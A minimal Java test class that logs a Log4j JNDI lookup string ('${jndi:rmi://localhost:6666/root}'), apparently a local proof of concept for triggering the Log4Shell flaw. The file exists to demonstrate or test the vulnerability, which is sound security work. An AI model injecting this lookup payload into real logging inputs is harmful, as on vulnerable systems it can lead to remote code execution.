package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test {

    private final static Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:rmi://localhost:6666/root}");
    }
}
